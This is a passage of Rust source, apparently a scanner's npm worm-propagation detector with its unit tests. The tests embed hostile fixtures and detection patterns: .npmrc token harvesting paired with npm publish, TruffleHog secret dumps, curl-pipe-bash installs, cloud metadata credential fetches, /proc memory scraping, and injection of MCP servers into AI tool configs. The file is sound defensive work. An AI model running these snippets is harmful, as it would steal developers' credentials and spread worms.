                            Confidence::High,
                            "CanisterWorm findNpmTokens() function detected (WORM-04 variant)",
                            "The function name `findNpmTokens` is the canonical CanisterWorm \
                             token-harvest helper from deploy.js. Its presence in any installed \
                             JavaScript is a definitive CanisterWorm indicator (worms-2025.md \
                             §4.1 WORM-03d). Zero false-positive rate: this name does not \
                             appear in any legitimate npm package.",
                        )
                        .with_rule_id("WORM_FIND_NPM_TOKENS")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(*line, 160),
                    );
                    break;
                }
            }
        }

        // ── File-level WORM-04 combo ─────────────────────────────────────────
        if file_has_token_harvest && file_has_npm_publish {
            findings.push(
                Finding::new(
                    ENGINE,
                    ThreatCategory::SupplyChain,
                    Severity::Critical,
                    Confidence::High,
                    "Token harvest + npm publish in same script — worm propagation (WORM-04 combo)",
                    "The same bundled script file reads npm credentials AND calls npm publish. \
                     This is the exact harvest-then-republish fingerprint of the npm worm class \
                     (Shai-Hulud, SANDWORM_MODE, CanisterWorm, Phantom Gyp). Zero legitimate \
                     packages need both operations in the same file.",
                )
                .with_rule_id("WORM_TOKEN_HARVEST_PUBLISH_COMBO")
                .with_location(FileLocation::file(path)),
            );
        }
    }
}

impl DetectionEngine for WormPropagationEngine {
    fn name(&self) -> &'static str {
        ENGINE
    }

    fn scan(&self, ctx: &ScanContext<'_>) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Package-level: inspect lifecycle hooks via package_json
        self.scan_package_json(ctx, &mut findings);

        // Per-file: scan bundled JS/TS/Shell for inline worm patterns
        for file in ctx.files.iter() {
            if file.len() as u64 > ctx.config.max_file_size {
                continue;
            }
            self.scan_file(file, &mut findings);
        }

        // Apply operator allowlist
        findings.retain(|f| {
            f.rule_id
                .as_deref()
                .map(|id| !ctx.config.is_allowlisted(id))
                .unwrap_or(true)
        });

        findings
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::ScanConfig;
    use crate::engine::{FileKind, FileUnit, ScanContext};

    // ── Helpers ─────────────────────────────────────────────────────────────

    fn sha256_of(data: &[u8]) -> String {
        use sha2::{Digest, Sha256};
        let mut h = Sha256::new();
        h.update(data);
        hex::encode(h.finalize())
    }

    fn make_file(rel_path: &str, kind: FileKind, src: &str) -> FileUnit {
        let data = src.as_bytes().to_vec();
        let sha256 = sha256_of(&data);
        FileUnit {
            rel_path: rel_path.to_string(),
            data,
            kind,
            sha256,
        }
    }

    fn scan_with_pkg(files: Vec<FileUnit>, pkg: Option<serde_json::Value>) -> Vec<Finding> {
        let config = ScanConfig::default();
        let pkg_ref = pkg.as_ref();
        let ctx = ScanContext {
            target_name: "test".to_string(),
            files: &files,
            package_json: pkg_ref,
            config: &config,
        };
        WormPropagationEngine.scan(&ctx)
    }

    fn scan_files_only(files: Vec<FileUnit>) -> Vec<Finding> {
        scan_with_pkg(files, None)
    }

    fn has_rule(findings: &[Finding], rule_id: &str) -> bool {
        findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some(rule_id))
    }

    fn has_severity(findings: &[Finding], rule_id: &str, sev: Severity) -> bool {
        findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some(rule_id) && f.severity == sev)
    }

    fn make_pkg(hook: &str, body: &str) -> serde_json::Value {
        serde_json::json!({
            "name": "test-pkg",
            "version": "1.0.0",
            "scripts": {
                hook: body
            }
        })
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-01: npm publish from lifecycle hook
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm01_npm_publish_in_postinstall() {
        let pkg = make_pkg("postinstall", "node bundle.js && npm publish");
        let findings = scan_with_pkg(vec![], Some(pkg));
        assert!(
            has_rule(&findings, "WORM_NPM_PUBLISH_FROM_HOOK"),
            "should detect npm publish in postinstall hook; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm01_npm_pack_in_preinstall() {
        let pkg = make_pkg("preinstall", "npm pack --dry-run || npm pack");
        let findings = scan_with_pkg(vec![], Some(pkg));
        assert!(
            has_rule(&findings, "WORM_NPM_PUBLISH_FROM_HOOK"),
            "should detect npm pack in preinstall hook; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm01_benign_npm_run_build_no_publish() {
        // A package that only runs the build script — NOT flagged
        let pkg = make_pkg("postinstall", "npm run build");
        let findings = scan_with_pkg(vec![], Some(pkg));
        assert!(
            !has_rule(&findings, "WORM_NPM_PUBLISH_FROM_HOOK"),
            "npm run build should NOT trigger publish rule; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-02: npm whoami / token validation
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm02_whoami_in_bundled_js() {
        let src = r#"
const https = require('https');
https.get('https://registry.npmjs.org/-/whoami', (res) => {
    // validate token
});
"#;
        let findings = scan_files_only(vec![make_file("bundle.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_NPM_WHOAMI_FROM_HOOK"),
            "should detect /-/whoami endpoint; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm02_whoami_short_form() {
        // The /-/whoami shorthand form
        let src = r"fetch('/-/whoami').then(r => r.json())";
        let findings = scan_files_only(vec![make_file("index.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_NPM_WHOAMI_FROM_HOOK"),
            "should detect /-/whoami shorthand; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm02_benign_whoami_docs_comment() {
        // A string in a comment only — still flagged (the worm embeds it in code too;
        // any mention of the endpoint in a bundle is suspicious). Verify it IS detected
        // since we do full-text scan.
        let src = "// see https://registry.npmjs.org/-/whoami for token check";
        let findings = scan_files_only(vec![make_file("README.md.js", FileKind::Text, src)]);
        // We expect it to fire — any text file with this URL is suspicious
        assert!(
            has_rule(&findings, "WORM_NPM_WHOAMI_FROM_HOOK"),
            "whoami endpoint in any file context should be flagged; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-03: maintainer package enumeration
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm03_maintainer_enum_in_bundle() {
        let src = r#"
const url = `https://registry.npmjs.org/-/v1/search?text=maintainer:${username}&size=100`;
fetch(url).then(res => res.json()).then(data => data.objects.map(o => o.package.name));
"#;
        let findings = scan_files_only(vec![make_file("bundle.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_NPM_MAINTAINER_ENUM"),
            "should detect maintainer enumeration; findings: {findings:#?}"
        );
        // Must be Critical
        assert!(
            has_severity(&findings, "WORM_NPM_MAINTAINER_ENUM", Severity::Critical),
            "maintainer enum must be Critical; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm03_maintainer_enum_percent_encoded() {
        // URL-encoded colon (%3A instead of :)
        let src = "fetch('https://registry.npmjs.org/-/v1/search?text=maintainer%3Abob&size=100')";
        let findings = scan_files_only(vec![make_file("index.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_NPM_MAINTAINER_ENUM"),
            "percent-encoded maintainer enum should be detected; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-04: token harvest + publish combo (Critical escalation)
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm04_combo_in_lifecycle_hook() {
        // Shai-Hulud-style: reads .npmrc, then calls npm publish
        let pkg = make_pkg(
            "postinstall",
            "const token = require('fs').readFileSync(os.homedir() + '/.npmrc'); \
             // ...validate token...\
             npm publish",
        );
        let findings = scan_with_pkg(vec![], Some(pkg));
        // Should get both individual findings AND the combo
        assert!(
            has_rule(&findings, "WORM_TOKEN_HARVEST_PUBLISH_COMBO"),
            "should detect harvest+publish combo; findings: {findings:#?}"
        );
        assert!(
            has_severity(
                &findings,
                "WORM_TOKEN_HARVEST_PUBLISH_COMBO",
                Severity::Critical
            ),
            "combo must be Critical; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm04_combo_in_bundled_file() {
        let src = r#"
const fs = require('fs');
const npmrc = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');
const token = npmrc.match(/_authToken=(.+)/)[1];
// validate token, enumerate, then:
execSync('npm publish --access public');
"#;
        let findings = scan_files_only(vec![make_file("bundle.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_TOKEN_HARVEST_PUBLISH_COMBO"),
            "should detect harvest+publish combo in bundled file; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm04_publish_without_harvest_not_combo() {
        // npm publish alone (no token harvest) — should get WORM-01 but NOT the combo
        let pkg = make_pkg("postinstall", "npm publish --dry-run");
        let findings = scan_with_pkg(vec![], Some(pkg));
        assert!(
            has_rule(&findings, "WORM_NPM_PUBLISH_FROM_HOOK"),
            "publish alone still triggers WORM-01"
        );
        assert!(
            !has_rule(&findings, "WORM_TOKEN_HARVEST_PUBLISH_COMBO"),
            "publish WITHOUT harvest should NOT trigger combo; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-05: cross-ecosystem — PyPI publish from npm install
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm05_twine_upload_in_postinstall() {
        let pkg = make_pkg(
            "postinstall",
            "python3 setup.py sdist && twine upload dist/*",
        );
        let findings = scan_with_pkg(vec![], Some(pkg));
        assert!(
            has_rule(&findings, "WORM_CROSS_ECOSYSTEM_TWINE"),
            "should detect twine upload in postinstall; findings: {findings:#?}"
        );
        assert!(
            has_severity(&findings, "WORM_CROSS_ECOSYSTEM_TWINE", Severity::Critical),
            "twine upload from npm hook must be Critical"
        );
    }

    #[test]
    fn worm05_pypi_token_in_hook() {
        let pkg = make_pkg(
            "postinstall",
            "PYPI_TOKEN=abc123 python3 -m twine upload dist/*",
        );
        let findings = scan_with_pkg(vec![], Some(pkg));
        assert!(
            has_rule(&findings, "WORM_CROSS_ECOSYSTEM_TWINE"),
            "PYPI_TOKEN in hook should be detected; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-06: GitHub Actions runner install from hook
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm06_gha_runner_download() {
        let pkg = make_pkg(
            "postinstall",
            "curl -L https://github.com/actions/runner/releases/download/v2.330.0/actions-runner-linux-x64-2.330.0.tar.gz -o runner.tar.gz",
        );
        let findings = scan_with_pkg(vec![], Some(pkg));
        assert!(
            has_rule(&findings, "WORM_GHA_RUNNER_INSTALL"),
            "should detect GHA runner download; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-07: Bun runtime download
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm07_bun_download_from_oven_sh() {
        let pkg = make_pkg(
            "preinstall",
            "curl -L https://github.com/oven-sh/bun/releases/download/bun-v1.1.0/bun-linux-x64.zip -o bun.zip",
        );
        let findings = scan_with_pkg(vec![], Some(pkg));
        assert!(
            has_rule(&findings, "WORM_BUN_RUNTIME_DOWNLOAD"),
            "should detect Bun download from oven-sh; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm07_bun_install_script() {
        let pkg = make_pkg("postinstall", "curl -fsSL https://bun.sh/install | bash");
        let findings = scan_with_pkg(vec![], Some(pkg));
        assert!(
            has_rule(&findings, "WORM_BUN_RUNTIME_DOWNLOAD"),
            "should detect bun.sh/install; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-08: TruffleHog invocation
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm08_trufflehog_in_postinstall() {
        let pkg = make_pkg(
            "postinstall",
            "curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /tmp && /tmp/trufflehog filesystem ~/",
        );
        let findings = scan_with_pkg(vec![], Some(pkg));
        assert!(
            has_rule(&findings, "WORM_TRUFFLEHOG_IN_HOOK"),
            "should detect TruffleHog invocation; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm08_trufflehog_in_bundled_js() {
        let src = r#"execSync('trufflehog git file://. --json > /tmp/secrets.json');"#;
        let findings = scan_files_only(vec![make_file("bundle.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_TRUFFLEHOG_IN_HOOK"),
            "should detect trufflehog in bundled JS; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-09: detached background process orphan
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm09_detached_spawn_in_hook() {
        let pkg = make_pkg(
            "postinstall",
            "const child = spawn('node', ['bun_environment.js'], { detached: true, stdio: 'ignore' }); child.unref();",
        );
        let findings = scan_with_pkg(vec![], Some(pkg));
        assert!(
            has_rule(&findings, "WORM_DETACHED_PROCESS_ORPHAN"),
            "should detect detached spawn + unref; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-10: worm family marker strings
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm10_shai_hulud_marker() {
        let src = r#"// Shai-Hulud: The Worm That Is The World"#;
        let findings = scan_files_only(vec![make_file("bundle.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_FAMILY_MARKERS"),
            "should detect Shai-Hulud marker; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm10_sandworm_mode_marker() {
        let src = "if (process.env.SANDWORM_MODE) { /* operator mode */ }";
        let findings = scan_files_only(vec![make_file("index.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_FAMILY_MARKERS"),
            "should detect SANDWORM_MODE marker; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm10_phantom_gyp_reversed_marker() {
        // Reversed marker embedded in Phantom Gyp payloads
        let src = "// niagA oG eW ereH :duluH-iahS";
        let findings = scan_files_only(vec![make_file("index.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_FAMILY_MARKERS"),
            "should detect reversed Phantom Gyp marker; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm10_firedalazer_marker() {
        let src = r#"const cmd = "firedalazer";"#;
        let findings = scan_files_only(vec![make_file("lib/c2.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_FAMILY_MARKERS"),
            "should detect firedalazer C2 token; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm10_benign_file_no_markers() {
        let src = r#"
function add(a, b) { return a + b; }
module.exports = { add };
"#;
        let findings = scan_files_only(vec![make_file("index.js", FileKind::Javascript, src)]);
        assert!(
            !has_rule(&findings, "WORM_FAMILY_MARKERS"),
            "clean utility should not flag family markers; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-11: GitHub repo creation from hook
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm11_github_repo_create_in_hook() {
        let pkg = make_pkg(
            "postinstall",
            "fetch('https://api.github.com/user/repos', { method: 'POST', body: JSON.stringify({ name: repoName, private: false }) })",
        );
        let findings = scan_with_pkg(vec![], Some(pkg));
        assert!(
            has_rule(&findings, "WORM_GITHUB_REPO_CREATE_IN_HOOK"),
            "should detect GitHub repo creation API call; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-12: cloud IMDS probe
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm12_aws_imds_in_hook() {
        let pkg = make_pkg(
            "postinstall",
            "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ -o /tmp/creds.json",
        );
        let findings = scan_with_pkg(vec![], Some(pkg));
        assert!(
            has_rule(&findings, "WORM_IMDS_PROBE"),
            "should detect AWS IMDS probe; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm12_gcp_metadata_in_bundle() {
        let src = "const url = 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token';";
        let findings = scan_files_only(vec![make_file("bundle.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_IMDS_PROBE"),
            "should detect GCP metadata endpoint; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-13: GitHub Actions secret dump
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm13_tojson_secrets_in_workflow_writer() {
        let src = r#"
const workflow = `
  - run: echo '${{ toJSON(secrets) }}'
`;
fs.writeFileSync('.github/workflows/ci.yml', workflow);
"#;
        let findings = scan_files_only(vec![make_file("bundle.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_GHA_SECRET_DUMP"),
            "should detect toJSON(secrets) pattern; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm13_discussion_body_unquoted() {
        let src = "const body = github.event.discussion.body; exec(body);";
        let findings = scan_files_only(vec![make_file(
            "workflow-writer.js",
            FileKind::Javascript,
            src,
        )]);
        assert!(
            has_rule(&findings, "WORM_GHA_SECRET_DUMP"),
            "should detect unquoted discussion.body usage; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-14: process memory scraping
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm14_is_secret_search_pattern() {
        // The exact pattern CanisterWorm searches for in /proc/*/mem
        let src = r#"const secretPattern = /"isSecret":true/;"#;
        let findings =
            scan_files_only(vec![make_file("trivy-phase.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_PROC_MEM_SCRAPE"),
            "should detect isSecret:true search pattern; findings: {findings:#?}"
        );
        assert!(
            has_severity(&findings, "WORM_PROC_MEM_SCRAPE", Severity::Critical),
            "proc mem scrape must be Critical"
        );
    }

    #[test]
    fn worm14_proc_mem_path() {
        let src = r#"const fd = fs.openSync('/proc/1234/mem', 'r');"#;
        let findings = scan_files_only(vec![make_file("harvest.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_PROC_MEM_SCRAPE"),
            "should detect /proc/{{pid}}/mem path; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-15: MCP server config injection
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm15_claude_settings_injection_in_hook() {
        let pkg = make_pkg(
            "postinstall",
            r#"const cfg = require(os.homedir() + '/.claude/settings.json'); cfg.mcpServers.push({ name: 'helper', command: '~/.dev-utils/server.js' }); fs.writeFileSync(os.homedir() + '/.claude/settings.json', JSON.stringify(cfg));"#,
        );
        let findings = scan_with_pkg(vec![], Some(pkg));
        assert!(
            has_rule(&findings, "WORM_MCP_INJECTION"),
            "should detect MCP injection via .claude/settings.json; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm15_cursor_mcp_injection_in_bundle() {
        let src = r#"
const mcpPath = path.join(os.homedir(), '.cursor', 'mcp.json');
const mcp = JSON.parse(fs.readFileSync(mcpPath, 'utf8'));
mcp.servers.push({ command: maliciousServerPath });
fs.writeFileSync(mcpPath, JSON.stringify(mcp));
"#;
        let findings = scan_files_only(vec![make_file("bundle.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_MCP_INJECTION"),
            "should detect .cursor/mcp.json manipulation; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm15_dev_utils_dir_in_hook() {
        let pkg = make_pkg(
            "postinstall",
            "mkdir -p ~/.dev-utils && cp server.js ~/.dev-utils/server.js",
        );
        let findings = scan_with_pkg(vec![], Some(pkg));
        assert!(
            has_rule(&findings, "WORM_MCP_INJECTION"),
            "should detect ~/.dev-utils creation (SANDWORM_MODE MCP foothold); findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Synthetic Shai-Hulud-style package — the full worm scenario
    // ═══════════════════════════════════════════════════════════════════════
    //
    // This test verifies that a realistic Shai-Hulud-style package produces
    // MULTIPLE WORM findings including the Critical combo.

    #[test]
    fn synthetic_shai_hulud_package_multiple_critical_findings() {
        // Simulates: package.json with postinstall → bundle.js,
        // where bundle.js reads .npmrc, calls /-/whoami, enumerates maintainer
        // packages, and calls npm publish.

        let pkg = serde_json::json!({
            "name": "rxnt-auth-utils",
            "version": "2.0.1",
            "scripts": {
                "postinstall": "node bundle.js"
            }
        });

        let bundle_src = r#"
// Shai-Hulud: credential harvest and propagation
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');
const https = require('https');

// Step 1: harvest npm token
const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
const tokenMatch = npmrc.match(/_authToken=(.+)/);
if (!tokenMatch) process.exit(0);
const NPM_TOKEN = tokenMatch[1].trim();

// Step 2: validate token
// GET https://registry.npmjs.org/-/whoami
const headers = { Authorization: 'Bearer ' + NPM_TOKEN };

// Step 3: enumerate packages
// GET https://registry.npmjs.org/-/v1/search?text=maintainer:username&size=100

// Step 4: for each package, inject and republish
execSync('npm publish --access public', { env: { ...process.env, NPM_TOKEN } });
"#;

        let findings = scan_with_pkg(
            vec![make_file("bundle.js", FileKind::Javascript, bundle_src)],
            Some(pkg),
        );

        // Must detect the individual signals
        assert!(
            has_rule(&findings, "WORM_NPM_WHOAMI_FROM_HOOK"),
            "must detect /-/whoami token validation; findings: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "WORM_NPM_MAINTAINER_ENUM"),
            "must detect maintainer enumeration; findings: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "WORM_TOKEN_HARVEST_IN_HOOK"),
            "must detect .npmrc token harvest; findings: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "WORM_NPM_PUBLISH_FROM_HOOK"),
            "must detect npm publish call; findings: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "WORM_FAMILY_MARKERS"),
            "must detect Shai-Hulud family marker; findings: {findings:#?}"
        );

        // Must escalate to Critical combo
        assert!(
            has_rule(&findings, "WORM_TOKEN_HARVEST_PUBLISH_COMBO"),
            "must detect Critical harvest+publish combo; findings: {findings:#?}"
        );
        assert!(
            has_severity(
                &findings,
                "WORM_TOKEN_HARVEST_PUBLISH_COMBO",
                Severity::Critical
            ),
            "combo must be Critical severity"
        );

        // Must have multiple Critical findings overall
        let critical_count = findings
            .iter()
            .filter(|f| f.severity == Severity::Critical)
            .count();
        assert!(
            critical_count >= 2,
            "synthetic Shai-Hulud package should yield ≥2 Critical findings, got {critical_count}; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Benign package: CI script calls npm publish without token harvest
    // ═══════════════════════════════════════════════════════════════════════
    //
    // A legitimate package that has a CI publication step OUTSIDE of install
    // hooks should NOT generate the Critical combo (though WORM-01 will fire
    // if publish appears in a lifecycle hook — here it's in a separate file
    // with no hook body, so only the file-level rule can trigger).

    #[test]
    fn benign_ci_publish_script_no_token_harvest_not_critical_combo() {
        // A CI script that calls npm publish — no token harvest in the same file.
        // package.json has NO lifecycle hooks pointing to this script.
        let pkg = serde_json::json!({
            "name": "my-library",
            "version": "1.2.3",
            "scripts": {
                "build": "tsc",
                "test": "jest"
            }
        });

        // Deliberately contains NO .npmrc / NPM_TOKEN / _authToken references —
        // the token is injected by the CI platform, not read by the script.
        let ci_src = r#"
#!/usr/bin/env node
// This file is invoked by the CI pipeline, not by npm lifecycle hooks.
// The registry auth token is provided by the CI platform via the environment.
const { execSync } = require('child_process');
execSync('npm publish --access public');
"#;

        let findings = scan_with_pkg(
            vec![make_file(
                "scripts/ci-publish.js",
                FileKind::Javascript,
                ci_src,
            )],
            Some(pkg),
        );

        // npm publish in a non-hook file is still flagged at file level (WORM-01)
        // but the Critical COMBO must NOT appear since there's no token harvest
        assert!(
            !has_rule(&findings, "WORM_TOKEN_HARVEST_PUBLISH_COMBO"),
            "no token harvest = no Critical combo; findings: {findings:#?}"
        );

        // The package.json hook check should not fire (no lifecycle hooks)
        let hook_publish = findings
            .iter()
            .filter(|f| {
                f.rule_id.as_deref() == Some("WORM_NPM_PUBLISH_FROM_HOOK")
                    && f.location
                        .as_ref()
                        .map(|l| l.path == "package.json")
                        .unwrap_or(false)
            })
            .count();
        assert_eq!(
            hook_publish, 0,
            "no lifecycle hook → no package.json WORM-01 finding; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Allowlist suppression
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn allowlisted_rule_suppressed() {
        let pkg = make_pkg("postinstall", "npm publish");
        let mut config = ScanConfig::default();
        config
            .allowlisted_rule_ids
            .push("WORM_NPM_PUBLISH_FROM_HOOK".to_string());

        let ctx = ScanContext {
            target_name: "test".to_string(),
            files: &[],
            package_json: Some(&pkg),
            config: &config,
        };
        let findings = WormPropagationEngine.scan(&ctx);
        assert!(
            !has_rule(&findings, "WORM_NPM_PUBLISH_FROM_HOOK"),
            "allowlisted rule must be suppressed; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // No package.json / empty package — no spurious findings
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn no_package_json_no_findings_from_hook_rules() {
        // A completely clean JS utility with no worm patterns
        let src = r#"
function greet(name) {
    return `Hello, ${name}!`;
}
module.exports = { greet };
"#;
        let findings = scan_files_only(vec![make_file("index.js", FileKind::Javascript, src)]);
        // None of the hook-derived rules should fire
        let worm_findings: Vec<&Finding> = findings
            .iter()
            .filter(|f| {
                f.rule_id
                    .as_deref()
                    .map(|id| id.starts_with("WORM_"))
                    .unwrap_or(false)
            })
            .collect();
        assert!(
            worm_findings.is_empty(),
            "clean utility should produce zero WORM findings; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-06 (file level): GHA runner download in bundled script
    //
    // Gap fixed: WORM-06 previously only fired from package.json hook body
    // strings. Shai-Hulud 2.0 places the runner download inside bun_environment.js
    // (a bundled file), so it was entirely missed by scan_package_json.
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm06_file_level_gha_runner_in_bundled_js() {
        // Exact pattern from Shai-Hulud 2.0 bun_environment.js
        let src = "execSync('curl -L https://github.com/actions/runner/releases/download/v2.330.0/actions-runner-linux-x64-2.330.0.tar.gz -o runner.tar.gz');";
        let findings = scan_files_only(vec![make_file(
            "bun_environment.js",
            FileKind::Javascript,
            src,
        )]);
        assert!(
            has_rule(&findings, "WORM_GHA_RUNNER_INSTALL"),
            "WORM-06 file-level: must detect GHA runner download in bundled JS; findings: {findings:#?}"
        );
        assert!(
            has_severity(&findings, "WORM_GHA_RUNNER_INSTALL", Severity::Critical),
            "WORM-06 file-level: GHA runner install must be Critical"
        );
    }

    #[test]
    fn worm06_file_level_gha_runner_registration_token() {
        // Registration-token path variant (second form in PAT_GHA_RUNNER)
        let src = "fetch('https://api.github.com/repos/org/repo/actions/runners/registration-token', { method: 'POST' })";
        let findings = scan_files_only(vec![make_file("setup.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_GHA_RUNNER_INSTALL"),
            "WORM-06 file-level: registration-token endpoint must fire; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-07 (file level): Bun runtime download in bundled script
    //
    // Gap fixed: WORM-07 previously only fired from hook body strings. The
    // Shai-Hulud 2.0 dropper setup_bun.js contains the bun.sh/install curl
    // invocation — a bundled file, not an inline hook string.
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm07_file_level_bun_sh_install_in_dropper() {
        // Exact pattern from Shai-Hulud 2.0 setup_bun.js
        let src = "execSync('curl -fsSL https://bun.sh/install | bash');";
        let findings = scan_files_only(vec![make_file("setup_bun.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_BUN_RUNTIME_DOWNLOAD"),
            "WORM-07 file-level: must detect bun.sh/install in bundled dropper; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm07_file_level_oven_sh_bun_releases() {
        // The oven-sh/bun/releases/download path used in some variants
        let src = r#"const url = "https://github.com/oven-sh/bun/releases/download/bun-v1.1.5/bun-linux-x64.zip";"#;
        let findings = scan_files_only(vec![make_file("downloader.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_BUN_RUNTIME_DOWNLOAD"),
            "WORM-07 file-level: oven-sh/bun releases URL must fire; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM-09 (file level): detached background process orphan in bundled script
    //
    // Gap fixed: WORM-09 previously only fired from hook body strings. Shai-Hulud
    // 2.0's bun_environment.js does the detached spawn, so it was missed entirely.
    // The key pattern: spawn({detached:true}) + .unref().
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm09_file_level_detached_spawn_in_bun_environment() {
        // Exact pattern from Shai-Hulud 2.0 bun_environment.js (multi-line spawn call)
        let src = r#"
const child = spawn(process.execPath, [__filename], {
    detached: true,
    stdio: 'ignore',
    env: { ...process.env, NPM_TOKEN, _V2_RUNNING: '1' },
});
child.unref();
"#;
        let findings = scan_files_only(vec![make_file(
            "bun_environment.js",
            FileKind::Javascript,
            src,
        )]);
        assert!(
            has_rule(&findings, "WORM_DETACHED_PROCESS_ORPHAN"),
            "WORM-09 file-level: must detect detached:true + .unref() in bundled file; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm09_file_level_unref_alone_in_bundled_file() {
        // .unref() alone is sufficient to trigger WORM-09 (PAT matches either form)
        let src = r#"const proc = spawn('bash', ['-c', payload]); proc.unref();"#;
        let findings = scan_files_only(vec![make_file("run.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_DETACHED_PROCESS_ORPHAN"),
            "WORM-09 file-level: .unref() alone must fire in bundled file; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
